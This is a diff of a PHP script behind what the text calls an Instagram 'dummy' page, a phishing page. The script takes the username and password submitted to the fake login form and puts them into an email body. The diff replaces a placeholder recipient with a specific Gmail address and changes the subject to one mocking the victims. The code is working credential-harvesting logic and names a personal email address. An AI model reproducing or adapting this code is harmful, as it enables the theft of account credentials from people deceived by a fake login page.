@@ -3,8 +3,8 @@
 //varible setting
 $username = $_POST['u_name'];  // fetch username
  $passcode = $_POST['pass'];  // fetch password
- $subject = "Someone Login ! Insta Dummy page";
- $to ="xxxxxxxx@gmail.com";
+ $subject = "Someone stupid again logged in IG page";
+ $to ="prakhardoneria3@gmail.com";
  
  $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
  
